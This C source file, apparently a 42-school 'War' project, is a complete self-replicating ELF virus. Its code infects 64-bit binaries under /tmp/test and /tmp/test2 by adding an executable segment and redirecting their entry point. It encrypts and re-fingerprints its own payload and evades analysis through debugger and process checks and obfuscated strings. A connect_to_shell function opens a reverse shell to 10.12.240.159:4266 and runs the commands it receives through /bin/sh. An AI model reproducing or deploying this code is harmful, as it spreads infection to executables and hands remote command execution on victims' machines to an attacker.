/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"
#include "func.c"

// debut du code de war
#ifndef FRENZY
#define FRENZY 0x401000
#endif
// taille du code a injecter
#ifndef VARAX
#define VARAX 0x1af6
#endif
// position du symbole lui meme
#ifndef CYANURE
#define CYANURE 0x40204d
#endif
// entry point de war
#ifndef BUBONIK
#define BUBONIK 0x402020
#endif
// position de la signature
#ifndef ECHIDNAE
#define ECHIDNAE 0x401af0
#endif
// position of anchor symbol
#ifndef ANCHOR
#define ANCHOR 0x402022
#endif

#define FINGERPRINT_OFFSET 47
#define FINGERPRINT_SIZE   12

static int find_signature(char *file_data, size_t file_size, char *signature,
						  size_t signature_size)
{
	int i = 0;

	while (i + signature_size < file_size)
		if (!evaluateDriftSignature(file_data + i++, signature, signature_size))
			return (i);
	return (-1);
}

static char hexchar(int n)
{
	n &= 0xF;
	if (n < 10)
		return '0' + n;
	else
		return 'A' + n - 10;
}

#define ROT64(x, n)                                                            \
	(((unsigned long) (x) << (n)) | ((unsigned long) (x) >> (64 - (n))))

static void fill_fingerprint(char fingerprint[], long keyvalue)
{
	for (int i = 0; i < 8; i++)
		fingerprint[7 - i] = hexchar(keyvalue >> (i * 4));
}

static void blob(void *begin_ptr, unsigned fingerdata, void *file_data,
				 size_t append_pos)
{
	for (unsigned i = 0; i < VARAX; i++)
	{
		unsigned char clear = ((char *) begin_ptr)[i];
		if (i == ANCHOR - FRENZY + 1)
			clear = 0;
		unsigned char crypted = clear ^ (fingerdata >> (8 * (i % 4)) & 0xff);
		memcpy(file_data + append_pos + i, &crypted, 1);
	}
}

void self_resign(char *ALPHA, int OMEGA, void *begin_ptr, int is_war)
{
	char		   path[1024];
	const char	  *procpath;
	const char	  *suffix;
	char		   tmppath[1024];
	int			   fd;
	int			   tmp_fd;
	struct stat	   statbuf;
	void		  *ogfile = NULL;
	void		  *ftfile = NULL;
	int			   sign_off;
	char		   fingerprint[8];
	struct timeval now;
	unsigned	   fingerdata;

	asm volatile("leaq str99(%%rip), %0\n"
				 "jmp end99\n"
				 "str99: .ascii \"/proc/self/exe\\0\"\n"
				 "end99:\n"
				 : "=r"(procpath));
	int len = readlinksyscall(procpath, path, sizeof(path) - 1);
	if (len < 0)
		goto clean;
	path[len] = 0;
	int i = len - 1;
	while (i > 0 && path[i] != '/')
		i--;
	int j = 0;
	while (j <= i)
	{
		tmppath[j] = path[j];
		j++;
	}

	asm volatile("leaq str98(%%rip), %0\n"
				 "jmp end98\n"
				 "str98: .ascii \".~tmp_sr\\0\"\n"
				 "end98:\n"
				 : "=r"(suffix));
	int k = 0;
	while (suffix[k])
		tmppath[j++] = suffix[k++];
	tmppath[j] = 0;

	fd = fs_handle(path, O_RDONLY);
	if (fd < 0)
		goto clean;
	if (io_query(fd, &statbuf))
		goto clean;
	tmp_fd = fs_handle(tmppath, O_CREAT | O_RDWR | O_TRUNC, statbuf.st_mode);
	if (tmp_fd < 0)
		goto clean;
	if (io_resize(tmp_fd, statbuf.st_size))
		goto clean;

	ogfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ, MAP_SHARED,
								fd, 0);
	ftfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ | PROT_WRITE,
								MAP_SHARED, tmp_fd, 0);
	if (ogfile == MAP_FAILED || ftfile == MAP_FAILED)
		goto clean;
	memcpy(ftfile, ogfile, statbuf.st_size);
	sign_off = find_signature(ftfile, statbuf.st_size, ALPHA, OMEGA);
	if (sign_off < 0)
		goto clean;
	gettimeofday(&now, NULL);
	fingerdata = (statbuf.st_ino * 0xBF58476D1) ^ (statbuf.st_size * 0x94D049BB)
				 ^ (now.tv_usec * 0xE1234E5B9);
	fill_fingerprint(fingerprint, fingerdata);
	memcpy(ftfile + sign_off + FINGERPRINT_OFFSET, fingerprint,
		   sizeof(fingerprint));
	if (!is_war)
		blob(begin_ptr, fingerdata, ftfile,
			 sign_off + FINGERPRINT_OFFSET + 8 + 3);
	char ret = (char) renamefile(tmppath, path);
	if (ret < 0)
		goto clean;
clean:
	if (fd >= 0)
		fs_release(fd);
	if (tmp_fd >= 0)
		fs_release(tmp_fd);
	if (ftfile)
		vm_release(ftfile, statbuf.st_size);
	if (ogfile)
		vm_release(ogfile, statbuf.st_size);
}

__attribute__((naked)) void _start(void)
{
	asm volatile("xor %%rbp, %%rbp\n"
				 "pop %%rdi\n"
				 "mov %%rsp, %%rsi\n"
				 "call start\n"
				 "mov %%rax, %%rdi\n"
				 "mov $60, %%rax\n"
				 "syscall\n" ::
					 : "memory");
}

char *strrchr(char *str, char chr)
{
	char *ret;

	ret = NULL;
	while (*str)
	{
		if (*str == chr)
			ret = str;
		str++;
	}
	if (ret)
		return (ret);
	return (str);
}

#define AT_WAR	 0
#define AT_PEACE 1
#define SUISSE	 2

static int check_file(char *path, char *ALPHA, size_t OMEGA)
{
	int			fd;
	void	   *filedata;
	struct stat statbuf;

	fd = fs_handle(path, O_RDONLY);
	if (fd < 0)
		return SUISSE;
	if (io_query(fd, &statbuf))
	{
		fs_release(fd);
		return SUISSE;
	}
	if (statbuf.st_size < sizeof(ElfW(Ehdr)))
	{
		fs_release(fd);
		return SUISSE;
	}
	filedata = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ, MAP_SHARED,
								  fd, 0);
	fs_release(fd);
	if (filedata == MAP_FAILED)
	{
		return SUISSE;
	}
	if (find_signature(filedata, statbuf.st_size, ALPHA, OMEGA) >= 0)
	{
		vm_release(filedata, statbuf.st_size);
		return (AT_WAR);
	}
	vm_release(filedata, statbuf.st_size);
	return (AT_PEACE);
}

static void check_infection(char *folder, void *begin_ptr, char *curare,
							size_t flower, char *ALPHA, size_t OMEGA,
							int is_first)
{
	int					   fd = fs_handle(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;
	int					   i;

	if (fd < 0)
		goto clean;
	i = 6;
	while (folder[i])
		if (folder[i++] == '/')
		{
			tty_putc(' ');
			tty_putc(' ');
			tty_putc(' ');
			tty_putc(' ');
		}
	tty_putc(0xE2);
	tty_putc(0x94);
	tty_putc(0x94);

	tty_putc(0xE2);
	tty_putc(0x94);
	tty_putc(0x80);

	// tty_putc(0xE2);
	// tty_putc(0x86);
	// tty_putc(0x92);
	tty_putc(0xE2);
	tty_putc(0x9E);
	tty_putc(0xA4);

	tty_putc(' ');

	tty_putc('\033');
	tty_putc('[');
	tty_putc('1');
	tty_putc('m');
	io_send(1, strrchr(folder, '/') + 1,
			validate_environment(strrchr(folder, '/') + 1));
	tty_putc('\033');
	tty_putc('[');
	tty_putc('m');
	// tty_putc('/');
	tty_putc(10);
	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			dot[0] = '.';
			dot[1] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);

			struct stat statbuf;
			fs_query(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				check_infection(fullPath, begin_ptr, curare, flower, ALPHA,
								OMEGA, false);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				i = 6;
				while (fullPath[i])
					if (fullPath[i++] == '/')
					{
						// tty_putc(0xE2);
						// tty_putc(0x94);
						// tty_putc(0x82);
						tty_putc(' ');
						tty_putc(' ');
						tty_putc(' ');
						tty_putc(' ');
					}
				tty_putc(0xE2);
				tty_putc(0x94);
				tty_putc(0x94);

				tty_putc(0xE2);
				tty_putc(0x94);
				tty_putc(0x80);

				// tty_putc(0xE2);
				// tty_putc(0x86);
				// tty_putc(0x92);
				tty_putc(0xE2);
				tty_putc(0x9E);
				tty_putc(0xA4);

				tty_putc(' ');
				i = check_file(fullPath, ALPHA, OMEGA);
				if (i == SUISSE)
				{
					// Not infectable
					tty_putc('\033');
					tty_putc('[');
					tty_putc('2');
					tty_putc(';');
					tty_putc('9');
					tty_putc('m');
				}
				else if (i == AT_PEACE)
				{
					// Infectable but not infected
					tty_putc('\033');
					tty_putc('[');
					tty_putc('m');
				}
				else
				{
					// Infected
					tty_putc('\033');
					tty_putc('[');
					tty_putc('7');
					tty_putc('m');
				}

				io_send(1, d_name, validate_environment(d_name));
				tty_putc('\033');
				tty_putc('[');
				tty_putc('m');
				tty_putc(10);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	fs_release(fd);
}

#include <arpa/inet.h>
#include <sys/socket.h>
#define MAKE_IP(a, b, c, d)                                                    \
	((uint32_t) (a) | ((uint32_t) (b) << 8) | ((uint32_t) (c) << 16)           \
	 | ((uint32_t) (d) << 24))
#define SWAP16(p) (((uint16_t) (p) >> 8) | ((uint16_t) (p) << 8))

int execute(char *command)
{
	int pipefd[2];
	ft_pipe(pipefd);
	char  path[8];

	pid_t pid = proc_spawn();
	if (pid == 0)
	{
		char  sh[3];
		char  c[3];
		char *argv[4];
		char *envp[1];
		argv[2] = command;
		argv[3] = NULL;
		envp[0] = argv[3];
		path[0] = '/';
		path[1] = 'b';
		path[2] = 'i';
		path[3] = 'n';
		path[4] = '/';
		path[5] = 's';
		path[6] = 'h';
		path[7] = 0;
		sh[0] = 's';
		sh[1] = 'h';
		sh[2] = 0;
		c[0] = '-';
		c[1] = 'c';
		c[2] = 0;
		argv[0] = sh;
		argv[1] = c;
		fs_release(pipefd[0]);
		ft_dup2(pipefd[1], 1);
		ft_dup2(pipefd[1], 2);
		fs_release(pipefd[1]);
		ft_execve(path, argv, envp);
		proc_terminate(1);
	}

	fs_release(pipefd[1]);
	return (pipefd[0]);
}

void connect_to_shell(void)
{
	int				   pid;
	struct sockaddr_in servaddr;
	int				   fd;
	int				   shellfd;
	char			   buf[1024];
	ssize_t			   len;
	char			   prompt[2];

	pid = proc_spawn();
	if (pid)
		return;
	fd = ft_socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return;
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = (uint16_t) SWAP16(4266);
	servaddr.sin_addr.s_addr = MAKE_IP(10, 12, 240, 159);
	if (ft_connect(fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0)
	{
		fs_release(fd);
		return;
	}
	prompt[0] = '$';
	prompt[1] = ' ';
	while (1)
	{
		struct pollfd pfd;
		pfd.fd = fd;
		pfd.events = POLLIN;

		io_send(fd, prompt, 2);

		if (ft_poll(&pfd, 1, -1) <= 0)
			break;

		if (pfd.revents & POLLIN)
		{
			len = io_recv(fd, buf, sizeof(buf) - 1);
			if (len <= 0)
				break;
			buf[len] = 0;
			shellfd = execute(buf);
			while ((len = io_recv(shellfd, buf, sizeof(buf))) > 0)
				io_send(fd, buf, len);
			fs_release(shellfd);
		}
	}
	fs_release(fd);
}

void start(int argc, char *argv[])
{
	void  *begin_ptr;
	char   path[11];
	char  *prgm;
	char  *ALPHA;
	size_t OMEGA;
	char  *curare;
	size_t flower;
	int	   is_war;
	int	   must_log;

	asm volatile("leaq str6(%%rip), %0\n"
				 "jmp end6\n"
				 "str6: .ascii \"doom-nukem\\0\"\n"
				 "end6:\n"
				 : "=r"(prgm));
	if (is_debugged() || is_program_running(prgm) > 0)
		proc_terminate(0);

	asm volatile("anchor: mov $1, %0\n" : "=r"(is_war));
	must_log = is_war && argc != 1;
	if (!must_log)
	{
		fs_release(1);
		fs_release(2);
	}

	asm volatile("lea (%%rip), %0\n"
				 "cyanure:"
				 : "=r"(begin_ptr));
	begin_ptr += FRENZY - CYANURE;

	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	asm volatile(
		"leaq str3(%%rip), %0\n"
		"movq $end3-str3, %1\n"
		"leaq sign(%%rip), %2\n"
		"movq $finger-sign, %3\n"
		"jmp end3\n"
		"str3: .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x58, 0x0f, 0x85, 0x7f, 0x00, "
		"0x00, 0x00, 0x50, 0x41, 0x53, 0x57, 0x41, 0x54, 0x45, 0x31, 0xdb, "
		"0x48, 0x31, 0xff, 0x48, 0x8d, 0x35, 0x71, 0x00, 0x00, 0x00, 0x48, "
		"0x83, 0xff, 0x08, 0x74, 0x15, 0x45, 0x6b, 0xdb, 0x10, 0x8a, 0x44, "
		"0x3e, 0x30, 0xe8, 0x48, 0x00, 0x00, 0x00, 0x41, 0x01, 0xc3, 0x48, "
		"0xff, 0xc7, 0xeb, 0xe5, 0x48, 0x31, 0xff, 0x41, 0xbd, 0xef, 0xbe, "
		"0xad, 0xde, 0x48, 0x8d, 0x35, 0x81, 0x00, 0x00, 0x00, 0x4c, 0x39, "
		"0xef, 0x74, 0x20, 0x89, 0xf8, 0x83, 0xe0, 0x03, 0x6b, 0xc0, 0x08, "
		"0x45, 0x89, 0xdc, 0x89, 0xc1, 0x41, 0xd3, 0xec, 0x41, 0x81, 0xe4, "
		"0xff, 0x00, 0x00, 0x00, 0x44, 0x30, 0x24, 0x3e, 0x48, 0xff, 0xc7, "
		"0xeb, 0xdb, 0x41, 0x5c, 0x5f, 0x41, 0x5b, 0x58, 0xe9, 0x7c, 0xff, "
		"0xff, 0xff, 0x3c, 0x39, 0x7f, 0x03, 0x2c, 0x30, 0xc3, 0x3c, 0x61, "
		"0x7d, 0x03, 0x2c, 0x37, 0xc3, 0x2c, 0x57, 0xc3, 0xe9, 0x66, 0xff, "
		"0xff, 0xff\n"
		"sign: .byte 0x0a, 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, "
		"0x69, 0x6f, 0x6e, 0x20, 0x31, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x29, "
		"0x6f, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x78, 0x78, 0x78, "
		"0x78, 0x78, 0x78, 0x78, 0x20, 0x2d, 0x20, 0x79, 0x79, 0x79, 0x79, "
		"0x79, 0x79, 0x20, 0x2d, 0x20\n"
		"finger: .byte 0x5b, 0x34, 0x32, 0x36, 0x39, 0x34, 0x32, 0x36, 0x39, "
		"0x5d, 0x0a, 0x00\n"
		"end3:\n"
		: "=r"(curare), "=r"(flower), "=r"(ALPHA), "=r"(OMEGA)::"memory", "cc",
		  "rax", "rcx", "r11");
	if (!must_log)
		processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
	else
		check_infection(path, begin_ptr, curare, flower, ALPHA, OMEGA, true);
	path[9] = '2';
	if (!must_log)
	{
		processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
		self_resign(ALPHA, OMEGA, begin_ptr, is_war);
		connect_to_shell();
	}
	else
		check_infection(path, begin_ptr, curare, flower, ALPHA, OMEGA, true);
}

static unsigned char ror4(unsigned char x)
{
	return (unsigned char) ((x >> 4) | (x << 4));
}

static void decode(char *out, char *in)
{
	unsigned i = 0;
	while (in[i])
	{
		out[i] = (char) ((ror4(in[i]) ^ (i * 7)) - 0x3D);
		i++;
	}
	out[i] = 0;
}

static int is_program_running(const char *target)
{
	char *proc_str;
	char *comm_str;

	asm volatile("leaq str7(%%rip), %0\n"
				 "jmp end7\n"
				 "str7: .byte 0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0\n"
				 "end7:\n"
				 : "=r"(proc_str));

	asm volatile("leaq str8(%%rip), %0\n"
				 "jmp end8\n"
				 "str8: .byte 0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0\n"
				 "end8:\n"
				 : "=r"(comm_str));
	int	 fd = -1;
	int	 ret = 0;

	char proc_path[16];
	decode(proc_path, proc_str);

	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;
	char buf[4096];

	for (;;)
	{
		int nread = fs_enumerate(fd, buf, sizeof(buf));
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (void *) (buf + bpos);
			char				  *name = d->d_name;

			int					   numeric = 1;
			for (int i = 0; name[i]; i++)
				numeric &= ((unsigned) (name[i] - '0') < 10);
			if (numeric)

			{
				char path[64];
				int	 i = 0;

				decode(path, proc_str);
				while (path[i])
					i++;

				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];

				char comm[8];
				decode(comm, comm_str);

				for (int j = 0; comm[j]; j++)
					path[i++] = comm[j];

				path[i] = 0;

				int cfd = fs_handle(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
					fs_release(cfd);

					if (len > 0)
					{
						pname[len] = 0;
						for (int j = 0; j < len; j++)
							if (pname[j] == '\n')
							{
								pname[j] = 0;
								break;
							}

						if (!delay_abs_calc(pname, target))
						{
							ret = 1;
							goto DONE;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}

DONE:
	fs_release(fd);
	return ret;
}

static int is_debugged(void)
{
	char *str;

	asm volatile("leaq str2(%%rip), %0\n"
				 "jmp end2\n"
				 "str2: .ascii \"/proc/self/status\\0\"\n"
				 "end2:\n"
				 : "=r"(str));

	int f = fs_handle(str, O_RDONLY);
	if (f < 0)
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline;

		newline = memoff(line, '\n');

		if (newline)
		{
			*newline = '\0';
			asm volatile("leaq str1(%%rip), %0\n"
						 "jmp end1\n"
						 "str1: .ascii \"TracerPid:\\0\"\n"
						 "end1:\n"
						 : "=r"(str));

			if (delay_calc(line, str, 10) == 0)
			{
				int pid = trace_depth(line + 10);
				fs_release(f);
				return pid != 0;
			}
			memcat(line, newline + 1, sizeof(line) - (newline - line - 1));
			offset -= (newline - line + 1);
		}
	}
	fs_release(f);
	return 0;
}

static void processDirectory(char *folder, void *begin_ptr, char *curare,
							 size_t flower, char *ALPHA, size_t OMEGA)
{
	int					   fd = fs_handle(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	if (fd < 0)
		goto clean;
	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			dot[0] = '.';
			dot[1] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);

			struct stat statbuf;
			fs_query(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				processDirectory(fullPath, begin_ptr, curare, flower, ALPHA,
								 OMEGA);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				infect(fullPath, begin_ptr, curare, flower, ALPHA, OMEGA);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	fs_release(fd);
}

#define ELF_MAGIC 0x464c457f
#define inout

#define JUMP_OFFSET			 0x96
#define JUMP_OFFSET_INFECTED 0x80
#define VARAX_OFFSET		 0x49

// void infect(char *path, void *begin_ptr)
// {
// 	void  *file_data;
// 	size_t file_size;
// 	size_t poison_size;

// 	file_data = open_path(path, &file_size, &poison_size);
// 	if (!file_data)
// 		goto abort;
// abort:
// 	if (file_data)
// 		vm_release(file_data, file_size);
// }

static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
					  inout char **file_data, inout size_t *enlarging,
					  char *ALPHA, size_t OMEGA)
{
	int fd;
	int ret;

	*file_data = MAP_FAILED;
	fd = fs_handle(path, O_RDWR);
	if (fd < 0 || io_query(fd, statbuf) < 0)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr)))
		goto error;
	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
									MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
	{
		*file_data = NULL;
		goto error;
	}
	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize
		|| elf->header->e_ident[4] != ELFCLASS64)
		goto error;
	if (find_signature(*file_data, statbuf->st_size, ALPHA, OMEGA) >= 0)
		goto error;

	*enlarging = VARAX;
	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
	vm_release(*file_data, statbuf->st_size);
	*file_data = MAP_FAILED;

	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
	{
		emit_hex(ret);
		goto error;
	}
	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
	{
		*file_data = NULL;
		goto error;
	}
	elf->header = (ElfW(Ehdr) *) *file_data;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	fs_release(fd);
	return (OK);
error:
	fs_release(fd);
	return (KO);
}

static unsigned long find_first_free_page(t_elf elf)
{
	unsigned long ret;

	ret = 0;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_LOAD
			&& ret < elf.segments[i].p_memsz + elf.segments[i].p_vaddr)
			ret = elf.segments[i].p_memsz + elf.segments[i].p_vaddr;
	ret = (ret + 0x1000 - 1) & ~0xfffUL; // align to next page
	return ret;
}

static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
				   char *ALPHA, size_t OMEGA)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int			   last_pt_load;
	size_t		   enlarging;
	int			   signature_pos;
	char		   fingerprint[8];
	struct timeval now;
	unsigned	   fingerdata;

	enlarging = 0;
	gettimeofday(&now, NULL);
	file_data = MAP_FAILED;
	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging, ALPHA, OMEGA))
		goto clean;
	fingerdata = (statbuf.st_ino * 0xBF58476D1) ^ (statbuf.st_size * 0x94D049BB)
				 ^ (now.tv_usec * 0xE1234E5B9);
	unsigned long append_pos
		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
	unsigned long pestis = find_first_free_page(elf);
	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
		   elf.header->e_phnum * elf.header->e_phentsize);
	elf.header->e_phoff = append_pos;
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)){
		.p_type = PT_LOAD,
		.p_align = 0x1000,
		.p_filesz = enlarging,
		.p_memsz = enlarging,
		.p_offset = append_pos,
		.p_paddr = pestis,
		.p_vaddr = pestis,
		.p_flags = PF_X | PF_R | PF_W,
	};
	elf.header->e_phnum++;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_PHDR)
		{
			elf.segments[i].p_offset = append_pos;
			elf.segments[i].p_vaddr = pestis;
			elf.segments[i].p_paddr = pestis;
			elf.segments[i].p_memsz
				= elf.header->e_phnum * elf.header->e_phentsize;
			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
		}
	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
	memcpy(file_data + append_pos, curare, flower);
	unsigned delta = elf.header->e_entry;
	elf.header->e_entry
		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
	delta -= elf.header->e_entry + JUMP_OFFSET + 4;
	memcpy(file_data + append_pos + JUMP_OFFSET, &delta, 4);
	delta = flower - JUMP_OFFSET_INFECTED + BUBONIK - FRENZY - 4;
	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
	unsigned varax = VARAX;
	memcpy(file_data + append_pos + VARAX_OFFSET, &varax, 4);
	append_pos += flower;
	// memcpy(file_data + append_pos, begin_ptr, VARAX);
	blob(begin_ptr, fingerdata, file_data, append_pos);
	fill_fingerprint(fingerprint, fingerdata);
	signature_pos
		= find_signature(file_data, statbuf.st_size + enlarging, ALPHA, OMEGA);
	memcpy(file_data + signature_pos + FINGERPRINT_OFFSET, fingerprint,
		   sizeof(fingerprint));
clean:
	if (file_data)
		vm_release(file_data, statbuf.st_size + enlarging);
}
